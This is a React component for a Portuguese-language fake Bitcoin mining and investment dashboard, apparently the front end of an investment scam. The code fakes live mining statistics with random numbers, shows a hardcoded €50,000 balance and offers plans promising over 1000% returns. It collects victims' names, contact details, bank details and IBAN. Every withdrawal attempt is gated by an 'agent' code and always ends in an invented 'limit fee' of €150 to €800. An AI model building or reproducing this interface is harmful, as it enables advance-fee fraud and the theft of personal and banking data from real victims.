"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Progress } from "@/components/ui/progress"
import {
  Bitcoin,
  TrendingUp,
  Wallet,
  ArrowUpRight,
  DollarSign,
  AlertTriangle,
  Star,
  User,
  CreditCard,
  Cpu,
  Zap,
  Thermometer,
  Activity,
  Server,
  Wifi,
  Clock,
  Target,
  BarChart3,
  Settings,
  Globe,
} from "lucide-react"

export default function BitcoinDashboard() {
  const [currentStep, setCurrentStep] = useState<
    "dashboard" | "withdrawal" | "plans" | "userInfo" | "balance" | "code" | "amount" | "bank" | "error"
  >("dashboard")
  const [selectedPlan, setSelectedPlan] = useState<string>("")
  const [userInfo, setUserInfo] = useState({
    name: "",
    email: "",
    phone: "",
    address: "",
  })
  const [withdrawalCode, setWithdrawalCode] = useState("")
  const [withdrawalAmount, setWithdrawalAmount] = useState("")
  const [bankDetails, setBankDetails] = useState({
    bankName: "",
    accountNumber: "",
    iban: "",
    accountHolder: "",
  })

  const [miningData, setMiningData] = useState({
    hashRate: 125.7,
    power: 3420,
    temperature: 68,
    efficiency: 94.2,
    blocksFound: 12,
    uptime: 99.8,
    activeMiners: 24,
    poolHashRate: 2847.3,
  })

  useEffect(() => {
    const interval = setInterval(() => {
      setMiningData((prev) => ({
        ...prev,
        hashRate: prev.hashRate + (Math.random() - 0.5) * 2,
        power: prev.power + Math.floor((Math.random() - 0.5) * 50),
        temperature: Math.max(60, Math.min(75, prev.temperature + (Math.random() - 0.5) * 2)),
        efficiency: Math.max(90, Math.min(98, prev.efficiency + (Math.random() - 0.5) * 0.5)),
      }))
    }, 3000)

    return () => clearInterval(interval)
  }, [])

  const handleWithdrawal = () => {
    setCurrentStep("code")
  }

  const handleInvest = () => {
    setCurrentStep("plans")
  }

  const handlePlanSelect = (plan: string) => {
    setSelectedPlan(plan)
    setCurrentStep("userInfo")
  }

  const handleUserInfoSubmit = () => {
    setCurrentStep("balance")
  }

  const handleAddFunds = () => {
    alert("Os seus detalhes foram enviados para o seu agente. Compra para começar a ganhar!")
  }

  const handleCodeSubmit = () => {
    if (
      withdrawalCode === "5544" ||
      withdrawalCode === "4455" ||
      withdrawalCode === "1020" ||
      withdrawalCode === "7788" ||
      withdrawalCode === "9900" ||
      withdrawalCode === "3366" ||
      withdrawalCode === "2211" ||
      withdrawalCode === "8844" ||
      withdrawalCode === "1234" ||
      withdrawalCode === "5678" ||
      withdrawalCode === "9876" ||
      withdrawalCode === "4321" ||
      withdrawalCode === "6789" ||
      withdrawalCode === "3456" ||
      withdrawalCode === "7890" ||
      withdrawalCode === "2468" ||
      withdrawalCode === "1357" ||
      withdrawalCode === "8642" ||
      withdrawalCode === "9753" ||
      withdrawalCode === "1470"
    ) {
      setCurrentStep("amount")
    } else {
      alert("Código inválido. Tente novamente.")
      setWithdrawalCode("")
    }
  }

  const handleAmountSubmit = () => {
    setCurrentStep("bank")
  }

  const handleBankSubmit = () => {
    setCurrentStep("error")
  }

  const getFeeAmount = () => {
    if (withdrawalCode === "5544") return "£200"
    if (withdrawalCode === "4455") return "€700"
    if (withdrawalCode === "1020") return "€500"
    if (withdrawalCode === "7788") return "€300"
    if (withdrawalCode === "9900") return "€150"
    if (withdrawalCode === "3366") return "€800"
    if (withdrawalCode === "2211") return "€400"
    if (withdrawalCode === "8844") return "€250"
    if (withdrawalCode === "1234") return "€350"
    if (withdrawalCode === "5678") return "€450"
    if (withdrawalCode === "9876") return "€600"
    if (withdrawalCode === "4321") return "€180"
    if (withdrawalCode === "6789") return "€750"
    if (withdrawalCode === "3456") return "€320"
    if (withdrawalCode === "7890") return "€550"
    if (withdrawalCode === "2468") return "€220"
    if (withdrawalCode === "1357") return "€480"
    if (withdrawalCode === "8642") return "€650"
    if (withdrawalCode === "9753") return "€380"
    if (withdrawalCode === "1470") return "€520"
    return "€700"
  }

  const getFeeMessage = () => {
    if (withdrawalCode === "1020") {
      return "É necessário pagar uma taxa de limite de €500. Já tratei do resto."
    }
    if (withdrawalCode === "7788") {
      return "É necessário pagar uma taxa de limite de €300. O agente já tratou do resto."
    }
    if (withdrawalCode === "9900") {
      return "É necessário pagar uma taxa de limite de €150. O agente já tratou do resto."
    }
    if (withdrawalCode === "3366") {
      return "É necessário pagar uma taxa de limite de €800. O agente já tratou do resto."
    }
    if (withdrawalCode === "2211") {
      return "É necessário pagar uma taxa de limite de €400. O agente já tratou do resto."
    }
    if (withdrawalCode === "8844") {
      return "É necessário pagar uma taxa de limite de €250. O agente já tratou do resto."
    }
    if (withdrawalCode === "1234") {
      return "É necessário pagar uma taxa de limite de €350. O agente já tratou do resto."
    }
    if (withdrawalCode === "5678") {
      return "É necessário pagar uma taxa de limite de €450. O agente já tratou do resto."
    }
    if (withdrawalCode === "9876") {
      return "É necessário pagar uma taxa de limite de €600. O agente já tratou do resto."
    }
    if (withdrawalCode === "4321") {
      return "É necessário pagar uma taxa de limite de €180. O agente já tratou do resto."
    }
    if (withdrawalCode === "6789") {
      return "É necessário pagar uma taxa de limite de €750. O agente já tratou do resto."
    }
    if (withdrawalCode === "3456") {
      return "É necessário pagar uma taxa de limite de €320. O agente já tratou do resto."
    }
    if (withdrawalCode === "7890") {
      return "É necessário pagar uma taxa de limite de €550. O agente já tratou do resto."
    }
    if (withdrawalCode === "2468") {
      return "É necessário pagar uma taxa de limite de €220. O agente já tratou do resto."
    }
    if (withdrawalCode === "1357") {
      return "É necessário pagar uma taxa de limite de €480. O agente já tratou do resto."
    }
    if (withdrawalCode === "8642") {
      return "É necessário pagar uma taxa de limite de €650. O agente já tratou do resto."
    }
    if (withdrawalCode === "9753") {
      return "É necessário pagar uma taxa de limite de €380. O agente já tratou do resto."
    }
    if (withdrawalCode === "1470") {
      return "É necessário pagar uma taxa de limite de €520. O agente já tratou do resto."
    }
    return `É necessário pagar uma taxa de limite de ${getFeeAmount()} para processar este levantamento.`
  }

  if (currentStep === "plans") {
    const plans = [
      { amount: "€100", returns: "€1,500", roi: "1400%", duration: "30 dias" },
      { amount: "€200", returns: "€2,800", roi: "1300%", duration: "45 dias" },
      { amount: "€300", returns: "€3,850", roi: "1183%", duration: "60 dias" },
      { amount: "€500", returns: "€5,600", roi: "1020%", duration: "90 dias" },
      { amount: "€600", returns: "€10,700", roi: "1683%", duration: "120 dias" },
    ]

    return (
      <div className="min-h-screen p-4 space-y-6 animate-slide-in-up">
        <div className="max-w-4xl mx-auto space-y-6">
          <div className="text-center space-y-2">
            <h1 className="text-3xl font-bold">Planos de Investimento</h1>
            <p className="text-muted-foreground">Escolha o plano que melhor se adequa aos seus objetivos</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {plans.map((plan, index) => (
              <Card
                key={index}
                className="relative hover:shadow-lg transition-all duration-300 cursor-pointer border-2 hover:border-primary"
                onClick={() => handlePlanSelect(plan.amount)}
              >
                {index === 2 && (
                  <div className="absolute -top-3 left-1/2 transform -translate-x-1/2">
                    <Badge className="bg-secondary text-secondary-foreground">
                      <Star className="h-3 w-3 mr-1" />
                      Popular
                    </Badge>
                  </div>
                )}
                <CardHeader className="text-center">
                  <CardTitle className="text-2xl text-primary">{plan.amount}</CardTitle>
                  <p className="text-muted-foreground">Investimento Inicial</p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="text-center">
                    <div className="text-3xl font-bold text-green-600">{plan.returns}</div>
                    <p className="text-sm text-muted-foreground">Retorno Esperado</p>
                  </div>
                  <Separator />
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className="text-sm">ROI:</span>
                      <span className="text-sm font-medium text-green-600">{plan.roi}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm">Duração:</span>
                      <span className="text-sm font-medium">{plan.duration}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm">Risco:</span>
                      <span className="text-sm font-medium text-yellow-600">Moderado</span>
                    </div>
                  </div>
                  <Button className="w-full" variant={index === 2 ? "default" : "outline"}>
                    Selecionar Plano
                  </Button>
                </CardContent>
              </Card>
            ))}
          </div>

          <div className="text-center">
            <Button variant="outline" onClick={() => setCurrentStep("dashboard")}>
              Voltar ao Dashboard
            </Button>
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "userInfo") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 animate-slide-in-up">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="flex items-center justify-center gap-2">
              <User className="h-6 w-6 text-primary" />
              Informações Pessoais
            </CardTitle>
            <p className="text-sm text-muted-foreground">
              Plano selecionado: <span className="font-medium text-primary">{selectedPlan}</span>
            </p>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-4">
              <div>
                <Label htmlFor="name">Nome Completo</Label>
                <Input
                  id="name"
                  value={userInfo.name}
                  onChange={(e) => setUserInfo({ ...userInfo, name: e.target.value })}
                  placeholder="Seu nome completo"
                />
              </div>
              <div>
                <Label htmlFor="email">Email</Label>
                <Input
                  id="email"
                  type="email"
                  value={userInfo.email}
                  onChange={(e) => setUserInfo({ ...userInfo, email: e.target.value })}
                  placeholder="seu@email.com"
                />
              </div>
              <div>
                <Label htmlFor="phone">Telefone</Label>
                <Input
                  id="phone"
                  value={userInfo.phone}
                  onChange={(e) => setUserInfo({ ...userInfo, phone: e.target.value })}
                  placeholder="+351 xxx xxx xxx"
                />
              </div>
              <div>
                <Label htmlFor="address">Morada</Label>
                <Input
                  id="address"
                  value={userInfo.address}
                  onChange={(e) => setUserInfo({ ...userInfo, address: e.target.value })}
                  placeholder="Sua morada completa"
                />
              </div>
              <div className="flex gap-2">
                <Button variant="outline" onClick={() => setCurrentStep("plans")} className="flex-1">
                  Voltar
                </Button>
                <Button
                  onClick={handleUserInfoSubmit}
                  className="flex-1"
                  disabled={!userInfo.name || !userInfo.email || !userInfo.phone}
                >
                  Continuar
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "balance") {
    return (
      <div className="min-h-screen p-4 animate-slide-in-up">
        <div className="max-w-2xl mx-auto space-y-6">
          <div className="text-center space-y-2">
            <h1 className="text-3xl font-bold">Sua Carteira</h1>
            <p className="text-muted-foreground">Bem-vindo à plataforma de investimento Bitcoin</p>
          </div>

          {/* Balance Card */}
          <Card className="text-center">
            <CardHeader>
              <CardTitle className="flex items-center justify-center gap-2">
                <Wallet className="h-6 w-6 text-primary" />
                Saldo Atual
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="text-4xl font-bold text-muted-foreground">€0.00</div>
              <p className="text-sm text-muted-foreground">Você ainda não participou em nenhum investimento</p>
              <Badge variant="outline" className="text-xs">
                Conta Inativa
              </Badge>
            </CardContent>
          </Card>

          {/* Selected Plan Info */}
          <Card>
            <CardHeader>
              <CardTitle>Plano Selecionado</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex justify-between items-center">
                <span>Investimento:</span>
                <span className="font-bold text-primary">{selectedPlan}</span>
              </div>
              <div className="flex justify-between items-center">
                <span>Status:</span>
                <Badge variant="outline" className="text-yellow-600">
                  Aguardando Ativação
                </Badge>
              </div>
              <Separator />
              <div className="text-sm text-muted-foreground space-y-2">
                <p>• Informações pessoais registadas</p>
                <p>• Aguardando confirmação do agente</p>
                <p>• Adicione fundos para começar a ganhar</p>
              </div>
            </CardContent>
          </Card>

          {/* Action Buttons */}
          <div className="space-y-4">
            <Button onClick={handleAddFunds} className="w-full h-12 text-lg">
              <CreditCard className="h-5 w-5 mr-2" />
              Adicionar Fundos para Começar a Ganhar
            </Button>
            <Button variant="outline" onClick={() => setCurrentStep("dashboard")} className="w-full">
              Voltar ao Dashboard
            </Button>
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "code") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 animate-fade-in">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="flex items-center justify-center gap-2">
              <Wallet className="h-6 w-6 text-primary" />
              Verificação de Segurança
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="text-center">
              <p className="text-muted-foreground mb-4">Insira o código do Investor Alisha para prosseguir</p>
              <div className="space-y-4">
                <div>
                  <Label htmlFor="code">Código de Verificação</Label>
                  <Input
                    id="code"
                    type="password"
                    value={withdrawalCode}
                    onChange={(e) => setWithdrawalCode(e.target.value)}
                    placeholder="Digite o código"
                    className="text-center text-lg"
                  />
                </div>
                <div className="flex gap-2">
                  <Button variant="outline" onClick={() => setCurrentStep("dashboard")} className="flex-1">
                    Cancelar
                  </Button>
                  <Button onClick={handleCodeSubmit} className="flex-1" disabled={!withdrawalCode}>
                    Verificar
                  </Button>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "amount") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 animate-fade-in">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="flex items-center justify-center gap-2">
              <DollarSign className="h-6 w-6 text-primary" />
              Valor do Levantamento
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="text-center">
              <p className="text-muted-foreground mb-4">Insira o valor que deseja levantar</p>
              <div className="space-y-4">
                <div>
                  <Label htmlFor="amount">Valor (€)</Label>
                  <Input
                    id="amount"
                    type="number"
                    value={withdrawalAmount}
                    onChange={(e) => setWithdrawalAmount(e.target.value)}
                    placeholder="0.00"
                    className="text-center text-lg"
                  />
                </div>
                <div className="text-sm text-muted-foreground">Saldo disponível: €50,000.00</div>
                <div className="flex gap-2">
                  <Button variant="outline" onClick={() => setCurrentStep("code")} className="flex-1">
                    Voltar
                  </Button>
                  <Button onClick={handleAmountSubmit} className="flex-1" disabled={!withdrawalAmount}>
                    Aceitar
                  </Button>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "bank") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 animate-fade-in">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="flex items-center justify-center gap-2">
              <Wallet className="h-6 w-6 text-primary" />
              Detalhes Bancários
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-4">
              <div>
                <Label htmlFor="bankName">Nome do Banco</Label>
                <Input
                  id="bankName"
                  value={bankDetails.bankName}
                  onChange={(e) => setBankDetails({ ...bankDetails, bankName: e.target.value })}
                  placeholder="Ex: Banco Santander Portugal"
                />
              </div>
              <div>
                <Label htmlFor="accountHolder">Titular da Conta</Label>
                <Input
                  id="accountHolder"
                  value={bankDetails.accountHolder}
                  onChange={(e) => setBankDetails({ ...bankDetails, accountHolder: e.target.value })}
                  placeholder="Nome completo"
                />
              </div>
              <div>
                <Label htmlFor="iban">IBAN</Label>
                <Input
                  id="iban"
                  value={bankDetails.iban}
                  onChange={(e) => setBankDetails({ ...bankDetails, iban: e.target.value })}
                  placeholder="PT50 0000 0000 0000 0000 0000 0"
                />
              </div>
              <div>
                <Label htmlFor="accountNumber">Número da Conta</Label>
                <Input
                  id="accountNumber"
                  value={bankDetails.accountNumber}
                  onChange={(e) => setBankDetails({ ...bankDetails, accountNumber: e.target.value })}
                  placeholder="Número da conta"
                />
              </div>
              <div className="flex gap-2">
                <Button variant="outline" onClick={() => setCurrentStep("amount")} className="flex-1">
                  Voltar
                </Button>
                <Button
                  onClick={handleBankSubmit}
                  className="flex-1"
                  disabled={!bankDetails.bankName || !bankDetails.iban || !bankDetails.accountHolder}
                >
                  Levantar
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "error") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 animate-fade-in">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="flex items-center justify-center gap-2 text-destructive">
              <AlertTriangle className="h-6 w-6" />
              Taxa de Limite
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <Alert className="border-destructive">
              <AlertTriangle className="h-4 w-4" />
              <AlertDescription>
                <strong>Erro:</strong> {getFeeMessage()}
              </AlertDescription>
            </Alert>
            <div className="text-center space-y-4">
              <p className="text-sm text-muted-foreground">
                Esta taxa é obrigatória para levantamentos acima de €1,000
              </p>
              <div className="flex gap-2">
                <Button variant="outline" onClick={() => setCurrentStep("dashboard")} className="flex-1">
                  Voltar ao Dashboard
                </Button>
                <Button variant="destructive" className="flex-1">
                  Pagar Taxa
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen p-4 space-y-6 animate-fade-in">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-primary rounded-lg animate-pulse-slow">
            <Bitcoin className="h-8 w-8 text-primary-foreground" />
          </div>
          <div>
            <h1 className="text-2xl font-bold">Centro de Mineração Bitcoin</h1>
            <p className="text-muted-foreground">Investor Alisha • Operação Industrial</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <Badge variant="secondary" className="status-active animate-pulse">
            <Activity className="h-3 w-3 mr-1" />
            Mineração Ativa
          </Badge>
          <Badge variant="outline" className="text-sm">
            <Wifi className="h-3 w-3 mr-1" />
            Online
          </Badge>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-primary">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Taxa de Hash</CardTitle>
            <Cpu className="h-4 w-4 text-primary animate-spin-slow" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-primary">{miningData.hashRate.toFixed(1)} TH/s</div>
            <p className="text-xs text-muted-foreground">Pool: {miningData.poolHashRate.toFixed(1)} TH/s</p>
          </CardContent>
        </Card>

        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-amber-500">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Consumo de Energia</CardTitle>
            <Zap className="h-4 w-4 text-amber-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-amber-600">{miningData.power.toLocaleString()} W</div>
            <p className="text-xs text-muted-foreground">Eficiência: {miningData.efficiency.toFixed(1)}%</p>
          </CardContent>
        </Card>

        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-red-500">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Temperatura</CardTitle>
            <Thermometer className="h-4 w-4 text-red-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-red-600">{miningData.temperature.toFixed(1)}°C</div>
            <p className="text-xs text-muted-foreground">Status: Normal</p>
          </CardContent>
        </Card>

        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-green-500">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Tempo Ativo</CardTitle>
            <Clock className="h-4 w-4 text-green-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-600">{miningData.uptime.toFixed(1)}%</div>
            <p className="text-xs text-muted-foreground">Últimos 30 dias</p>
          </CardContent>
        </Card>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Server className="h-5 w-5 text-primary" />
              Estado do Hardware de Mineração
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-sm font-medium">Antminer S19 Pro #001</span>
                </div>
                <div className="text-right">
                  <div className="text-sm font-bold">104.2 TH/s</div>
                  <div className="text-xs text-muted-foreground">67°C</div>
                </div>
              </div>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-sm font-medium">Antminer S19 Pro #002</span>
                </div>
                <div className="text-right">
                  <div className="text-sm font-bold">102.8 TH/s</div>
                  <div className="text-xs text-muted-foreground">69°C</div>
                </div>
              </div>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></div>
                  <span className="text-sm font-medium">Antminer S19 Pro #003</span>
                </div>
                <div className="text-right">
                  <div className="text-sm font-bold">98.1 TH/s</div>
                  <div className="text-xs text-amber-600">72°C - Atenção</div>
                </div>
              </div>
            </div>
            <Separator />
            <div className="flex justify-between text-sm">
              <span className="text-muted-foreground">Total de Mineradores Ativos:</span>
              <span className="font-bold text-primary">{miningData.activeMiners}/24</span>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Target className="h-5 w-5 text-primary" />
              Descoberta de Blocos
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="text-center">
              <div className="text-3xl font-bold text-primary">{miningData.blocksFound}</div>
              <p className="text-sm text-muted-foreground">Blocos encontrados este mês</p>
            </div>
            <Separator />
            <div className="space-y-2">
              <div className="flex justify-between text-sm">
                <span>Último bloco:</span>
                <span className="font-medium">há 2h 34min</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Recompensa:</span>
                <span className="font-medium text-green-600">6.25 BTC</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Dificuldade atual:</span>
                <span className="font-medium">62.46 T</span>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <Card className="hover:shadow-md transition-shadow">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Lucro Total de Mineração</CardTitle>
            <TrendingUp className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-600">€50,000.00</div>
            <p className="text-xs text-muted-foreground">+12.5% desde o último mês</p>
            <div className="mt-2">
              <Progress value={75} className="h-2" />
              <p className="text-xs text-muted-foreground mt-1">Meta mensal: 75%</p>
            </div>
          </CardContent>
        </Card>

        <Card className="hover:shadow-md transition-shadow">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Preço Bitcoin</CardTitle>
            <Bitcoin className="h-4 w-4 text-muted-foreground animate-bounce-slow" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">€42,350.00</div>
            <p className="text-xs text-green-600 flex items-center">
              <ArrowUpRight className="h-3 w-3 mr-1" />
              +2.4% (24h)
            </p>
            <div className="mt-2 text-xs text-muted-foreground">Próximo halving: ~2028</div>
          </CardContent>
        </Card>

        <Card className="hover:shadow-md transition-shadow">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Carteira de Mineração</CardTitle>
            <Wallet className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">1.18 BTC</div>
            <p className="text-xs text-muted-foreground">Valor: €49,973.00</p>
            <div className="mt-2 text-xs text-muted-foreground">Minerado: 0.85 BTC | Comprado: 0.33 BTC</div>
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Globe className="h-5 w-5 text-primary" />
            Informações do Pool de Mineração
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="space-y-2">
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Pool:</span>
                <span className="text-sm font-medium">F2Pool</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Taxa do Pool:</span>
                <span className="text-sm font-medium">2.5%</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Método de Pagamento:</span>
                <span className="text-sm font-medium">PPS+</span>
              </div>
            </div>
            <div className="space-y-2">
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Hashrate do Pool:</span>
                <span className="text-sm font-medium">2,847.3 TH/s</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Mineradores Ativos:</span>
                <span className="text-sm font-medium">45,231</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Latência:</span>
                <span className="text-sm font-medium text-green-600">12ms</span>
              </div>
            </div>
            <div className="space-y-2">
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Último Pagamento:</span>
                <span className="text-sm font-medium">há 6 horas</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Valor:</span>
                <span className="text-sm font-medium text-green-600">0.0234 BTC</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-muted-foreground">Próximo Pagamento:</span>
                <span className="text-sm font-medium">em 18 horas</span>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Activity className="h-5 w-5 text-primary" />
            Atividades de Mineração Recentes
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="p-2 bg-green-100 rounded-full">
                  <Target className="h-4 w-4 text-green-600" />
                </div>
                <div>
                  <div className="font-medium">Bloco Descoberto</div>
                  <div className="text-sm text-muted-foreground">Hoje, 14:30 • Bloco #820,145</div>
                </div>
              </div>
              <div className="text-right">
                <div className="font-medium text-green-600">+6.25 BTC</div>
                <div className="text-sm text-muted-foreground">€264,687.50</div>
              </div>
            </div>
            <Separator />
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="p-2 bg-blue-100 rounded-full">
                  <Zap className="h-4 w-4 text-blue-600" />
                </div>
                <div>
                  <div className="font-medium">Pagamento do Pool</div>
                  <div className="text-sm text-muted-foreground">Hoje, 08:00 • F2Pool</div>
                </div>
              </div>
              <div className="text-right">
                <div className="font-medium text-green-600">+0.0234 BTC</div>
                <div className="text-sm text-muted-foreground">€991.89</div>
              </div>
            </div>
            <Separator />
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="p-2 bg-amber-100 rounded-full">
                  <AlertTriangle className="h-4 w-4 text-amber-600" />
                </div>
                <div>
                  <div className="font-medium">Alerta de Temperatura</div>
                  <div className="text-sm text-muted-foreground">Ontem, 15:45 • Minerador #003</div>
                </div>
              </div>
              <div className="text-right">
                <Badge variant="outline" className="text-amber-600">
                  Resolvido
                </Badge>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Settings className="h-5 w-5 text-primary" />
            Controles da Operação
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <Button onClick={handleWithdrawal} className="h-12 hover:scale-105 transition-transform">
              <Wallet className="h-4 w-4 mr-2" />
              Levantar Fundos
            </Button>
            <Button
              onClick={handleInvest}
              variant="outline"
              className="h-12 bg-transparent hover:scale-105 transition-transform"
            >
              <TrendingUp className="h-4 w-4 mr-2" />
              Expandir Operação
            </Button>
            <Button variant="secondary" className="h-12 hover:scale-105 transition-transform">
              <BarChart3 className="h-4 w-4 mr-2" />
              Relatórios Detalhados
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
